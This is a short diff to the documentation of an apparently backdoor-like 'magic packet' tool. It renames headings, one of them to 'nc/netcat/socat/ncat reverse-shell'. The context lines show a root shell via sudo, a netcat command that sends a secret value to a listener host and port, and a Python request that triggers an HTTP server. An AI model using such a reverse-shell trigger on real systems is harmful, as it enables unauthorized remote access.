@@ -44,7 +44,7 @@ sudo su
 whoami
 root
 ```
-nc/netcat/socat/ncat:
+nc/netcat/socat/ncat reverse-shell:
 ```bash
 MAGIC="secret"
 SERVER_HOST="localhost"
@@ -55,7 +55,7 @@ echo $MAGIC | nc -c -vvv $MAGIC_LISTENER_HOST $MAGIC_LISTENER_PORT && echo "Succ
 # Do whatever you want here, 
 # See server_main.sh and client.sh for more documentation.
 ```
-Magic packet that starts an HTTP Server with Python:
+Python: Send a magic packet that starts an HTTP Server
 ```text
 In [1]: import requests
 In [2]: requests.get('http://localhost:80')
